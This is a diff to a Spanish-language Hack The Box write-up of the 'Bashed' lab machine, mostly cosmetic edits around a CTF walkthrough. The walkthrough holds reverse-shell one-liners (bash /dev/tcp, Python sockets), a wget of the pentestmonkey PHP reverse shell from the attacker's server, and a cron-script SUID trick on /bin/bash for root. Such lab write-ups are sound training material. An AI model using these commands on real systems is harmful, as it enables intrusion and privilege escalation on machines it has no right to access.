@@ -1,7 +1,7 @@
 ---
 layout: single
 title: Bashed - Hack The Box
-excerpt: "Una máquina realmente sencilla, si acaso lo que costo un poquillo fue el cómo usar el comando scriptmanager, pero de ahí en fuera, todo fue fácil. Vamos a aprovecharnos de una subpágina que es una shell de bash como web, la cual vamos a usar para conectarnos de manera remota y en la cual, usaremos el usuario scriptmanager para escalar privilegios, usando un script en Python con él cambiaremos los permisos de la Bash para convertirnos en Root."
+excerpt: "Una máquina realmente sencilla. Vamos a aprovecharnos de una subpágina que es una shell de bash como web, la cual vamos a usar para conectarnos de manera remota y en la cual, usaremos el usuario scriptmanager para escalar privilegios, usando un script en Python con él cambiaremos los permisos de la Bash para convertirnos en Root."
 date: 2023-04-17
 classes: wide
 header:
@@ -14,18 +14,19 @@ categories:
 tags:
   - Linux
   - Fuzzing
-  - WebShell Bash
+  - PHP
+  - Abusing PHP WebShell
   - Reverse Shell
-  - Script Manager
   - CronJob Exploitation
-  - Abusing Sudoers Privilege
+  - Privesc - Abusing Sudoers Privileges
   - OSCP Style
 ---
 ![](/assets/images/htb-writeup-bashed/bashed_logo.png)
 
-Una máquina realmente sencilla, si acaso lo que costo un poquillo fue el cómo usar el comando **scriptmanager**, pero de ahí en fuera, todo fue fácil. Vamos a aprovecharnos de una subpágina que es una shell de bash como web, la cual vamos a usar para conectarnos de manera remota y en la cual, usaremos el usuario **scriptmanager** para escalar privilegios, usando un script en **Python** con él cambiaremos los permisos de la **Bash** para convertirnos en **Root**.
+Una máquina realmente sencilla. Vamos a aprovecharnos de una subpágina que es una shell de **Bash** como web, la cual vamos a usar para conectarnos de manera remota y en la cual, usaremos el usuario **scriptmanager** para escalar privilegios, usando un script en **Python** con él cambiaremos los permisos de la **Bash** para convertirnos en **Root**.
 
 Herramientas utilizadas:
+* *ping*
 * *nmap*
 * *wappalizer*
 * *wfuzz*
@@ -80,10 +81,7 @@ Herramientas utilizadas:
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
 </div>
 <br>
 
@@ -172,10 +170,7 @@ Solo nos menciona que usa el servicio **Apache**. Vamos a analizar la página.
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
 </div>
 <br>
 
@@ -218,22 +213,9 @@ Total requests: 220560
 ID           Response   Lines    Word       Chars       Payload                                                              
 =====================================================================
 
-000000001:   200        161 L    397 W      7743 Ch     "# directory-list-2.3-medium.txt"                                    
-000000003:   200        161 L    397 W      7743 Ch     "# Copyright 2007 James Fisher"                                      
-000000007:   200        161 L    397 W      7743 Ch     "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"    
 000000338:   200        16 L     59 W       939 Ch      "php"                                                                
 000000016:   200        19 L     88 W       1564 Ch     "images"                                                             
 000000014:   200        161 L    397 W      7743 Ch     "http://10.10.10.68//"                                               
-000000013:   200        161 L    397 W      7743 Ch     "#"                                                                  
-000000012:   200        161 L    397 W      7743 Ch     "# on atleast 2 different hosts"                                     
-000000011:   200        161 L    397 W      7743 Ch     "# Priority ordered case sensative list, where entries were found"   
-000000010:   200        161 L    397 W      7743 Ch     "#"                                                                  
-000000009:   200        161 L    397 W      7743 Ch     "# Suite 300, San Francisco, California, 94105, USA."                
-000000006:   200        161 L    397 W      7743 Ch     "# Attribution-Share Alike 3.0 License. To view a copy of this"      
-000000008:   200        161 L    397 W      7743 Ch     "# or send a letter to Creative Commons, 171 Second Street,"         
-000000005:   200        161 L    397 W      7743 Ch     "# This work is licensed under the Creative Commons"                 
-000000002:   200        161 L    397 W      7743 Ch     "#"                                                                  
-000000004:   200        161 L    397 W      7743 Ch     "#"                                                                  
 000000550:   200        20 L     96 W       1758 Ch     "css"                                                                
 000000834:   200        17 L     69 W       1148 Ch     "dev"                                                                
 000000953:   200        26 L     165 W      3165 Ch     "js"                                                                 
@@ -258,8 +240,7 @@ Requests/sec.: 414.3847
 
 <br>
 
-Ahora, probemos con **Gobuster**:
-
+Ahora, probemos con **gobuster**:
 ```bash
 gobuster dir -u http://10.10.10.68/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20
 ===============================================================
@@ -298,6 +279,8 @@ Progress: 220483 / 220561 (99.96%)
 
 Pues arrojo casi los mismos resultados, solo por curiosidad, veamos que nos dice **nmap** cuando apliquemos **fuzzing**.
 
+<br>
+
 <h3 id="NMAP">Fuzzing con NMAP</h3>
 
 ```bash
@@ -332,10 +315,7 @@ A cualquiera de esos archivos que le demos click, nos va a mandar a una **bash i
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
 </div>
 <br>
 
@@ -357,7 +337,7 @@ listening on [any] 443 ...
 
 * Vamos a usar el siguiente one-liner que es una **Reverse Shell**:
 ```bash
-bash -c "bash -i >& /dev/tcp/10.10.14.16/443 0>&1"
+bash -c "bash -i >& /dev/tcp/Tu_IP/443 0>&1"
 ```
 PERO, vamos a **url encodearlo** cambiando los **ampersands (&)** por **%26**. Una vez que lo hagas, ejecutalo y ya debería estar:
 
@@ -367,7 +347,7 @@ PERO, vamos a **url encodearlo** cambiando los **ampersands (&)** por **%26**. U
 ```bash
 nc -nvlp 443                                                    
 listening on [any] 443 ...
-connect to [10.10.14.16] from (UNKNOWN) [10.10.10.68] 45400
+connect to [Tu_IP] from (UNKNOWN) [10.10.10.68] 45400
 bash: cannot set terminal process group (815): Inappropriate ioctl for device
 bash: no job control in this shell
 www-data@bashed:/var/www/html/dev$ 
@@ -421,9 +401,10 @@ Recordemos 2 cosas, una que la página trabaja con **PHP** y que tiene una carpe
 </p>
 
 Bien, ya conocemos una **Reverse Shell** de **PHP**, busquemos a **Pentestmonkey**:
-* https://github.com/pentestmonkey/php-reverse-shell
+* <a href="https://github.com/pentestmonkey/php-reverse-shell" target="_blank">Repositorio de pentestmonkey: php-reverse-shell</a>
 
 Ahora, hagamos todo por pasos:
+
 * Clonamos la **Reverse Shell** de **PHP**:
 ```bash
 wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
@@ -443,7 +424,7 @@ $daemon = 0;
 $debug = 0;
 ```
 
-* Levantamos un servidor en python en donde tenemos la **Reverse Shell**:
+* Levantamos un servidor en **Python** en donde tenemos la **Reverse Shell**:
 ```bash
 python3 -m http.server   
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
@@ -458,7 +439,7 @@ wget Tu_IP:8000/php-reverse-shell.php
 <img src="/assets/images/htb-writeup-bashed/Captura8.png">
 </p>
 
-* Bien, alzamos una netcat:
+* Bien, alzamos una **netcat**:
 ```bash
 nc -nvlp 443                                                    
 listening on [any] 443 ...
@@ -474,9 +455,11 @@ Y ya deberíamos estar conectados.
 
 <h3 id="Python">Usando Reverse Shell de Python</h3>
 
-Con **python**, podemos ganar acceso de manera remota si utilizamos un one-liner que usa sockets para estableces una conexión, entre nuestra máquina y la máquina víctima, PERO no es una sesión interactiva, es decir, que no podremos usar **nano**. 
+Con **Python**, podemos ganar acceso de manera remota si utilizamos un one-liner que usa sockets para estableces una conexión, entre nuestra máquina y la máquina víctima, PERO no es una sesión interactiva, es decir, que no podremos usar **nano**.
 
-Nunca esta demás usar siempre otras alternativas. Vamos a hacerlo por pasos:
+Nunca esta demás usar siempre otras alternativas. 
+
+Vamos a hacerlo por pasos:
 
 * Alzamos una **netcat**:
 ```bash
@@ -493,7 +476,7 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 ```bash
 nc -nvlp 443
 listening on [any] 443 ...
-connect to [10.10.14.62] from (UNKNOWN) [10.10.10.68] 60532
+connect to [Tu_IP] from (UNKNOWN) [10.10.10.68] 60532
 www-data@bashed:/var/www/html/dev$ whoami
 whoami
 www-data
@@ -506,10 +489,7 @@ Y con esto terminamos.
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Post" style="text-align:center;">Post Explotación</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Post" style="text-align:center;">Post Explotación</h1>
 </div>
 <br>
 
@@ -552,11 +532,7 @@ Matching Defaults entries for www-data on bashed:
 User www-data may run the following commands on bashed:
     (scriptmanager : scriptmanager) NOPASSWD: ALL
 ```
-
-Mmmm no sé qué es eso de **scriptmanager**, vamos a buscar un poco para ver de que se trata. 
-
-Encontré este link:
-* https://f1uffygoat.com/privesc/
+Veo que el usuario **scriptmanager** no necesita ninguna contraseña.
 
 Vamos a entrar como **scriptmanager**:
 ```bash
@@ -582,7 +558,7 @@ scriptmanager@bashed:/$ find / -type f -user scriptmanager 2>/dev/null
 ...
 ```
 
-Veo algo curioso ahí, un archivo en Python dentro del directorio **scripts**, vamos a investigarlo:
+Veo algo curioso ahí, un archivo en **Python** dentro del directorio **scripts**, vamos a investigarlo:
 ```bash
 scriptmanager@bashed:/$ cd /scripts
 scriptmanager@bashed:/scripts$ ls -la
@@ -606,9 +582,9 @@ Quiero pensar, que el script de **Python** se ejecuta automáticamente como una 
 
 <h2 id="Root">Acceso como Root Usando Tarea Cron</h2>
 
-Ahora, sabemos que podemos usar **nano** dentro la máquina víctima, vamos a modificar el script de **Python** para que modifique los permisos de la **bash**, para que cualquier usuario pueda entrar como **Root**. 
+Ahora, sabemos que podemos usar **nano** dentro la máquina víctima, vamos a modificar el script de **Python** para que modifique los permisos de la **Bash**, para que cualquier usuario pueda entrar como **Root**.
 
-* Revisa los permisos de la bash:
+* Revisa los permisos de la **Bash**:
 ```bash
 scriptmanager@bashed:/scripts$ ls -la /bin/bash
 -rwxr-xr-x 1 root root 1037528 Jun 24  2016 /bin/bash
@@ -617,7 +593,6 @@ scriptmanager@bashed:/scripts$ ls -la /bin/bash
 * Opción 1 - borra el contenido del script y pon lo siguiente:
 ```python
 import os
-
 chmod u+s /bin/bash
 ```
 
@@ -626,13 +601,13 @@ chmod u+s /bin/bash
 echo "import os; os.system('chmod u+s /bin/bash');" > exploit.py
 ```
 
-* Excelente, una vez que guardes y cierres o que hayas usado la opción 2, revisa los permisos de la **bash**:
+* Excelente, una vez que guardes y cierres o que hayas usado la opción 2, revisa los permisos de la **Bash**:
 ```bash
 scriptmanager@bashed:/scripts$ ls -la /bin/bash
 -rwsr-xr-x 1 root root 1037528 Jun 24  2016 /bin/bash
 ```
 
-Listo, entra a la **bash** como **Root**:
+Listo, entra a la **Bash** como **Root**:
 ```bash
 scriptmanager@bashed:/scripts$ bash -p
 bash-4.3# whoami
@@ -662,10 +637,7 @@ Y si, con esto terminamos esta máquina.
 <br>
 <br>
 <div style="position: relative;">
- <h2 id="Links" style="text-align:center;">Links de Investigación</h2>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h2 id="Links" style="text-align:center;">Links de Investigación</h2>
 </div>
 
 
@@ -678,3 +650,48 @@ Y si, con esto terminamos esta máquina.
 
 <br>
 # FIN
+
+<footer id="myFooter">
+    <!-- Footer para eliminar el botón -->
+</footer>
+
+<style>
+        #backToIndex {
+                display: none;
+                position: fixed;
+                left: 87%;
+                top: 90%;
+                z-index: 2000;
+                background-color: #81fbf9;
+                border-radius: 10px;
+                border: none;
+                padding: 4px 6px;
+                cursor: pointer;
+        }
+</style>
+
+<a id="backToIndex" href="#Indice">
+        <img src="/assets/images/arrow-up.png" style="width: 45px; height: 45px;">
+</a>
+
+<script>
+    window.onscroll = function() { showButton() };
+
+    function showButton() {
+        const scrollPosition = document.documentElement.scrollTop || document.body.scrollTop;
+        const indicePosition = document.getElementById("Indice").offsetTop;
+        const footerPosition = document.getElementById("myFooter").offsetTop;
+        const windowHeight = window.innerHeight;
+
+        const button = document.getElementById("backToIndex");
+
+        // Mostrar el botón si el usuario ha bajado al índice
+        if (scrollPosition >= indicePosition && (scrollPosition + windowHeight) < footerPosition) {
+            button.style.display = "block";
+            button.style.position = "fixed";
+            button.style.top = "90%";
+        } else {
+            button.style.display = "none";
+        }
+    }
+</script>
